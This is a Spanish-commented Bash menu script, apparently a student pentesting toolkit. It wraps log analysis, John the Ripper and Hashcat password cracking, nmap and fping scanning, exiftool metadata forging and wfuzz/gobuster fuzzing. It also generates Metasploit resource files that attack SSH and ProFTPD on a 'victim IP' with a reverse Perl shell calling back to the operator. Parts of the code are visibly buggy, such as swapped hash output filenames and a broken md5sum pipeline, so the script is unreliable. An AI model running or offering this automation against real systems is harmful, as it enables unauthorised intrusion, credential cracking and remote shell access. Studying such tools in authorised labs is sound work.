
############################## FUNCIONES ####################################

## Crear el titulo de MENU personalizado 

titulo() {
    figlet -f standard.flf  '       Menu' 
}

colores_titulo() {
    cyan() { echo "\e[1;36m$1\e[0m"; }  # Cyan brillante
    yellow() { echo "\e[1;33m$1\e[0m"; } # Amarillo brillante
    green() { echo "\e[1;32m$1\e[0m"; }  # Verde brillante
    red() { echo "\e[1;31m$1\e[0m"; }    # Rojo brillante
    blue() { echo "\e[1;34m$1\e[0m"; }   # Azul brillante
}

## 1 - Saludar

saludar(){
    figlet -f big   '       Hola que tal?' | lolcat
}

## 2 - Informe de Logs del sistema

logs(){
    read -p "Inserte la ruta del log nginx: " nginx

    if [ ! -f "$nginx" ]; then
        red "El archivo no existe o no es válido. Por favor, inténtelo de nuevo."
        return
    fi

    blue "═══════════════════════════════════════"
    red "--------------Selecciona --------------"
    blue "═══════════════════════════════════════"
    cyan "1.Solicitudes a horas poco habituales"
    cyan "2.Intentos de acceso repetidos a 404"
    cyan "3.Número elevado de solicitudes en un periodo corto"
    cyan "4.Acceso a directorios restringidos"
    cyan "5.Generar Informe"
    cyan "6.Salir"

    read -p "Opcion: " opcion_log

    if [ "$opcion_log" -eq 1 ] 2>/dev/null; then

        red "------- Solicitudes a horas poco habituales -------------"
        echo ""
        ##Cojo el 4rto valor separado por espacios, cuento desde la posicion numero 14 y los siguientes 8 caracteres. Una vez obtenida la hora, la comparo con grep con el formato de la franja que quiero flitrar.
        awk '{print $1, "---> " substr ($4,14,8)}' $nginx | grep "0[1-6]:[0-5][0-9]:[0-5][0-9]"

    elif [ "$opcion_log" -eq 2 ] 2>/dev/null; then

        red "------------ Intentos de acceso repetidos a 404 ------------"
        echo ""
        ##Cojo la IP y el codigo de error, filtro por los 404, los ordeno y los cuento. Con awk hago que me muestre las IP que se han repetido mas de 1 vez, y lo muestro.
        cut -d " " -f 1,9 $nginx | grep 404 | sort | uniq -c | awk '$1 > 1 {print $1, $2}' | awk '{print "IP:" $2 "," "Intentos de acceso: "  $1 }'

    elif [ "$opcion_log" -eq 3 ] 2>/dev/null; then
        red "------------ número elevado de solicitudes en un periodo corto ----------" 
        echo ""
        ## Hago que el uniq solo compare los primeros 24 valores (IP y hora:minuto)
        awk '{print $1, "---> " substr ($4,14,8)}' $nginx | sort | uniq -w 23 -d

    elif [ "$opcion_log" -eq 4 ] 2>/dev/null; then
        red "--------------- Acceso a directorios restringidos -------------"
        echo ""
        ##Filtro con grep por los posibles directorios sensibles.
        grep -Ei "admin|login|wp-admin|/etc/passwd|/var*|/proc*" $nginx | awk '{print "IP: " $1 "," "Ruta critica: " $7}' | sort | uniq

    elif [ "$opcion_log" -eq 5 ] 2>/dev/null; then

        yellow "Generando informe de logs..."

        # Solicitudes a horas poco habituales
        red "------- Solicitudes a horas poco habituales -------------" > informe_logs.txt
        echo "" >> informe_logs.txt
        awk '{print $1, "---> " substr ($4,14,8)}' $nginx | grep "0[1-6]:[0-5][0-9]:[0-5][0-9]" >> informe_logs.txt
        echo "" >> informe_logs.txt
        #Intentos de acceso repetidos a 404
        red "------------ Intentos de acceso repetidos a 404 ------------" >> informe_logs.txt
        echo "" >> informe_logs.txt
        cut -d " " -f 1,9 $nginx | grep 404 | sort | uniq -c | awk '$1 > 1 {print $1, $2}' | awk '{print "IP:" $2 "," "Intentos de acceso: "  $1 }' >> informe_logs.txt
        echo "" >> informe_logs.txt
        #Número elevado de solicitudes en un periodo corto
        red "------------ número elevado de solicitudes en un periodo corto ----------" >> informe_logs.txt
        echo "" >> informe_logs.txt
        awk '{print $1, "---> " substr ($4,14,8)}' $nginx | sort | uniq -w 23 -d >> informe_logs.txt
        echo "" >> informe_logs.txt
        #Acceso a directorios restringidos
        red "--------------- Acceso a directorios restringidos -------------" >> informe_logs.txt
        echo "" >> informe_logs.txt
        grep -Ei "admin|login|wp-admin|/etc/passwd|/var*|/proc*" $nginx | awk '{print "IP: " $1 "," "Ruta critica: " $7}' | sort | uniq >> informe_logs.txt
    
    else

        echo "Saliendo..."
        break
    fi
}   


## 3 - Ataques de diccionario

ataque(){
    while true; do
        ## Pedir hash al usuario
        read -p "Introduce el hash: " hash

        ##Comprobar si el input no está vacio
    if [ -z "$hash" ];then
        red "Debes introducir un hash"
    else
        break
    fi
    done
        ## Usar el hashid
        hashid -m $hash

    ## Guardar el hash en un archivo de texto
    echo $hash > hash.txt

    ## Selección del diccionario
    blue "═════════════════════════════════════════════════════"
    red "--------------Selecciona diccionario ----------------"
    blue "═════════════════════════════════════════════════════"
    echo "1. Diccionario por defecto (/usr/share/john/password.lst)"
    cyan "2. Diccionario Rockyou"
    green "3. Otro diccionario (ruta personalizada)"
    read -p "Opción: " opcion_dicc

    case $opcion_dicc in
        1) 
            diccionario="/usr/share/john/password.lst" 
        
        ;;
        
        2) 
            if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
                diccionario="/usr/share/wordlists/rockyou.txt"
            else
                red "El archivo rockyou.txt no se encuentra en la ruta esperada (/usr/share/wordlists/rockyou.txt)"
                return
            fi
            ;;
        3) 
            read -p "Introduce la ruta del diccionario: " diccionario
            if [ ! -f "$diccionario" ]; then
                red "El archivo del diccionario no existe. Saliendo..."
                return
            fi
            ;;
        *) 
            red "Opción no válida. Saliendo..."
            return
            ;;
    esac


    blue "═══════════════════════════════════════"
    red "--------------Selecciona --------------"
    blue "═══════════════════════════════════════"
    cyan "1.Crear hash"
    cyan "2.Ataque de diccionario con John the Ripper"
    cyan "3.Ataque de diccionario con Hashcat"
    cyan "4.Salir"

    read -p "Opcion: " opcion_ataque
    

    case $opcion_ataque in

        1) 
            read -p "Introduce la contraseña que deseas hashear: " contra

            blue "═══════════════════════════════════════"
            red "--------------Selecciona --------------"
            blue "═══════════════════════════════════════"
            cyan "1.SHA256"
            cyan "2.MD5"
            cyan "3.base64"
            cyan "4.Salir"

            read -p "Escoge una opción: " opcion_algoritmo_contra

            case "$opcion_algoritmo_contra" in

                1)
                    echo "$contra" | sha256sum  > md5.hash

                    yellow "Creando el hash en md5.hash"
                ;;

                2)
                    echo "$contra" | md5sum && cut -d " " -f 1 > sha256.hash

                    yellow "Creando el hash en sha256.hash"
                ;;

                3)
                    echo "$contra" | base64 && cut -d " " -f 1 > base64.hash

                    yellow "Creando el hash en base64.hash"
                ;;

                *)
                    return
                ;;
            esac
        ;;
        2)        
        
            ## Introducir el algoritmo. Con el bucle hago que si sucede algun problema, que si el input está vacio se vuelva a pedir el algoritmo. Si pulsa 1, le saldra la lista de algoritmos y que si pulsa 2, se salga.

            while true; do
                read -p "Selecciona el algoritmo del hash (md5, sha1, sha256, sha512...). Mira la lista con 1, o pulsa 2 para salir: " algoritmo

                if [ -z "$algoritmo" ]; then
                    yellow "No se ha seleccionado ningún algoritmo."
                    continue
                fi

                if [ "$algoritmo" -eq 1 ] 2>/dev/null; then
                    john --list=formats
                    continue

                elif [ "$algoritmo" -eq 2 ] 2>/dev/null; then
                    yellow "Saliendo..."
                    return
                fi 
                
                # Ejecutar el comando para listar los algoritmos soportados por John the Ripper
                john --list=formats | grep -qw "$algoritmo"

                # Verificar el código de salida del comando para ver si la ejecucion de la busqueda ha sido 0 (correcto) o 1 (incorrecto)
                if [ $? -eq 0 ]; then
                    echo "Algoritmo '$algoritmo' válido."
                    break
                else
                    red "Algoritmo no válido. Intenta con uno de los algoritmos soportados."
                    continue
                fi
            done
            
            ## Ejecuto el john y no lo muestro por pantalla

            john --wordlist=$diccionario --format=$algoritmo hash.txt > john_temp.txt

            ## Muestro el resultado del crackeo
            green "Contraseña encontrada: $(john --show --format=$algoritmo hash.txt | cut -d ":" -f2)"
            
            ## Eliminar el fichero del hash y el temporal
            rm -f hash.txt
            rm -f john_temp.txt
        ;;

        3)
            ## Introducir el algoritmo. Con el bucle hago que si sucede algun problema, que si el input está vacio se vuelva a pedir el algoritmo. Si pulsa 1, le saldra la lista de algoritmos y que si pulsa 2, se salga.

            while true; do
                read -p "Selecciona el algoritmo del hash (0, 5, 10...). Mira la lista de ayuda con 1, o pulsa 2 para salir: " algoritmo

                if [ -z "$algoritmo" ]; then
                    yellow "No se ha seleccionado ningún algoritmo."
                    continue
                fi


                if [ "$algoritmo" -eq 1 ] 2>/dev/null; then
                    hashcat --help
                    continue

                elif [ "$algoritmo" -eq 2 ] 2>/dev/null; then
                    yellow "Saliendo..."
                    return
                fi 

                ## Comprueba que el valor de algoritmo introducido es numerico y que no da error con el -eq. Si no lo es, da error y vuelve a pedir el modo
                if [ "$algoritmo" -eq "$algoritmo" ] 2>/dev/null; then
                    break
                else
                    red "Error: Introduce un número válido."
                    continue
                    
                fi
                
            done
            
            ## Ejecuto el hashcat y lo muestro por pantalla

            hashcat -m $algoritmo -a 0 hash.txt $diccionario > hashcat_temp.txt

            ## Mostrar resultados
            green "Contraseña encontrada: $(hashcat --show -m $algoritmo hash.txt | cut -d ":" -f2)" 
            
            ## Eliminar el fichero del hash y el temporal
            rm -f hash.txt
            rm -f hashcat_temp.txt
    
        ;;

        *)
            yellow "Saliendo..."
            return

        ;;
    esac
}

## 4 - Fingerprinting

fingerprint(){


    while true;do
        read -p "Inserte la direccion de red para el escaneo: " red

        if [ -z "$red" ]; then
            red "No se ha seleccionado ninguna red"
        else
            break
        fi

    done
    while true; do

        yellow "Introduce 1 para ver parametros disponibles"
        yellow "Nota: la opcion -g está integrada por defecto"
        read -p "Atributos adicionales (todo junto con '-' delante): " atributos
        
        if [ "$atributos" = 1 ]; then
            fping --help
        
        else 
            break
        fi

    done

    ## Escaneo con fping
    fping -g $atributos $red

    ## Solicitar puertos abiertos de la ip que pongamos
    read -p "Puertos abiertos de la IP: " ipnmap
    
    ## Escanear con nmap la IP encontrada
    yellow "Guardando datos en "$ipnmap.txt...""
    nmap --open -n --min-rate 5000 -Pn $ipnmap | grep "open" > $ipnmap.txt
      
    ## Dar opciones de scripts nmap
    yellow "Nota: Escribe el script con el nombre completo --script=..."
    read -p "Si quieres meter script inserta aqui, sinó dejalo vacío: " script

    ## Escanear con script si el usuario hubiera elegido poner alguno
    if [ ! -z $script ]; then
        nmap --open -n --min-rate 5000 -Pn $ipnmap $script
    fi
}

## 5 - Footprinting

footprinting(){

    blue "════════════════════════════════════════════════"
    red "--------------METADATOS CON EXIFTOOL ------------"
    blue "════════════════════════════════════════════════"
    cyan "1.Metadatos de los ficheros de la ruta actual"
    cyan "2.Metadatos de ruta especifica"
    cyan "3.Metadatos de fichero específico"
    cyan "4.Editar metadatos de fichero especifico"
    cyan "5.Volver atrás"

    read -p "Elige una opción: " opcion_meta

    case $opcion_meta in

        1)
            exiftool *
        ;;

        2)
            while true;do
            
                read -p "Ingresa la ruta a analizar (vacío para salir): " ruta_meta

                if [ -z "$ruta_meta" ];then

                    yellow "Saliendo..."
                    return

                fi
                
                if [ -d "$ruta_meta" ];then
                
                    exiftool $ruta_meta/*
                    return
                else
                    red "No se ha encontrado la ruta especificada"
                    continue
                fi
            done
        ;;

        3)

            while true;do
                read -p "Ingresa la ruta al fichero especifico (vacio para salir): " fichero_meta
                
                if [ -z "$fichero_meta" ];then

                    yellow "Saliendo..."
                    return

                fi

                if [ -f "$fichero_meta" ];then
                    
                    exiftool $fichero_meta
                    return

                else
                    red "No se ha encontrado el fichero especificado"
                    continue
                fi
            done
        ;;

        4)
            while true;do
                read -p "Escoge el fichero que quieres modificar (vacio para salir): " modificar_meta

                if [ -z "$modificar_meta" ];then

                    yellow "Saliendo..."
                    return

                fi

                if [ -f "$modificar_meta" ];then
                    
                    blue "════════════════════════════════════════════════"
                    red "--------------EDITAR METADATOS ------------"
                    blue "════════════════════════════════════════════════"
                    cyan "1.Cambiar nombre del fichero"
                    cyan "2.Cambiar autor"
                    cyan "3.Cambiar modelo de dispositivo"
                    cyan "4.Cambiar el numero de serie"
                    cyan "5.Volver atrás"

                    read -p "Elige una opcion: " opcion_meta_cambiar

                    case "$opcion_meta_cambiar" in

                        1)

                            read -p "Ingresa el nuevo nombre: " nombre_meta

                            exiftool -FileName="$nombre_meta" $modificar_meta
                        ;;

                        2)
                            read -p "Ingresa el nuevo autor: " autor_meta

                            exiftool -overwrite_original -Author="$autor_meta" $modificar_meta
                        ;;

                        3)
                            read -p "Ingresa el nuevo modelo: " modelo_meta

                            exiftool -overwrite_original -Model="$modelo_meta" $modificar_meta
                        ;;

                        4)
                            read -p "Ingresa el nuevo numero de serie: " serie_meta

                            exiftool -overwrite_original -SerialNumber="$serie_meta" $modificar_meta
                        ;;

                        *)
                            yellow "Saliendo..."
                            return
                        ;;


                    esac
                    

                else
                    red "No se ha encontrado el fichero especificado"
                    continue
                fi
            done

        ;;


        5)

            yellow "Saliendo..."
        ;;
    esac
}


## 6 - Fuzzing

fuzzing(){

    blue "════════════════════════════════════════════════"
    red "-------------- FUZZING ------------"
    blue "════════════════════════════════════════════════"
    cyan "1.Fuzzing con WFuzz"
    cyan "2.Fuzzing con Gobuster"
    cyan "3.Volver atrás"

    read -p "Elige una opción: " opcion_fuzz

    case "$opcion_fuzz" in

        1)
            read -p "Introduce la URL completa de la web: " url_fuzz

            #Sanitizo la url introducida paraque el fichero donde se almacene tenga de nombre la IP Victima
            url_sanitizada=$( echo "$url_fuzz" | awk -F '//' '{print $2}')

            ## Ejecutar el fuzzing y mostrarlo en pantalla y que lo guarde en un fichero (tee)
            wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 $url_fuzz/FUZZ | tee wfuzz_$url_sanitizada.txt

            yellow "Generando fichero de salida..."
        ;;

        2)
            read -p "Introduce la URL completa de la web: " url_gobuster

            url_sanitizada=$( echo "$url_gobuster" | awk -F '//' '{print $2}')

            gobuster dir -w /usr/share/wordlists/dirb/common.txt -u $url_gobuster | tee gobuster_$url_sanitizada.txt

            yellow "Generando fichero de salida..."
        ;;

        *)
            yellow "Saliendo..."
            return

    esac
}

## 7 - Metasploit

metasploit(){
  
    blue "═════════════════════════════════════════════════"
    red "-----------Selecciona que quieres vulnerar--------"
    blue "═════════════════════════════════════════════════"
    green "1. SSH"
    green "2. FTP"
    red "3. Salir"
    echo "========================================"
    read -p "Elige una opción: " opcion_exploit

    case "$opcion_exploit" in

        1)

        read -p "Introduce IP victima: " rhost

        read -p "Introduce la IP local: " lhost

        read -p "Introduce el usuario ssh: " username

        read -p "Introduce la contraseña: " password

    # Crea un archivo temporal con los comandos para Metasploit
    cat << EOF > metasploit_commands.rc
    use exploit/multi/ssh/sshexec
    set RHOSTS $rhost
    set LHOST $lhost
    set USERNAME $username
    set PASSWORD $password
    exploit
EOF
    
    # Ejecuta msfconsole con el archivo de comandos
    sudo msfconsole -r metasploit_commands.rc
        ;;

        2)
        

        read -p "Introduce IP victima: " rhost

        read -p "Introduce la IP local: " lhost


    # Crea un archivo temporal con los comandos para Metasploit
    cat << EOF > metasploit_commands.rc
    use unix/ftp/proftpd_modcopy_exec
    set RHOSTS $rhost
    set LHOST $lhost
    set SITEPATH /var/www/html/
    set PAYLOAD cmd/unix/reverse_perl
    set LHOST $lhost
    exploit
EOF
    
    # Ejecuta msfconsole con el archivo de comandos
    sudo msfconsole -r metasploit_commands.rc
        ;;

        *)
            break
        ;;
    esac
    
}

###################################### SCRIPT ###############################
while true; do

    colores_titulo
    titulo
    blue "═══════════════════════════════════════"
    red "--------------Selecciona --------------"
    blue "═══════════════════════════════════════"
    green "1. Saludar"
    cyan "2. Análisis de logs"
    yellow "3. Ataque de diccionario"
    green "4. Fingerprinting"
    cyan "5. Footprinting"
    yellow "6. Fuzzing"
    blue "7. Ataque con metasploit"
    red "8. Salir"
    echo "========================================"
    read -p "Elige una opción: " opcion


    if [ "$opcion" -eq 1 ] 2>/dev/null; then

        saludar

    elif [ "$opcion" -eq 2 ] 2>/dev/null; then
        echo "Realizando análisis de logs..."

        logs

    elif [ "$opcion" -eq 3 ] 2>/dev/null; then
        echo "Has seleccionado: ataque de diccionario..."
        
        ataque

    elif [ "$opcion" -eq 4 ] 2>/dev/null; then
        echo "Ejecutando Fingerprinting..."

        fingerprint

    elif [ "$opcion" -eq 5 ] 2>/dev/null; then
        echo "Iniciando Footprinting..."
        
        footprinting

    elif [ "$opcion" -eq 6 ] 2>/dev/null; then
        echo "Lanzando Fuzzing..."

        fuzzing

    elif [ "$opcion" -eq 7 ] 2>/dev/null; then
        echo "Preparando ataque con Metasploit..."
        
        metasploit

    elif [ "$opcion" -eq 8 ] 2>/dev/null; then
        echo "Saliendo del menú. ¡Adiós!"
        break
    else
        echo "Opción no válida, por favor intenta nuevamente."
    fi

    echo
    echo
    echo

done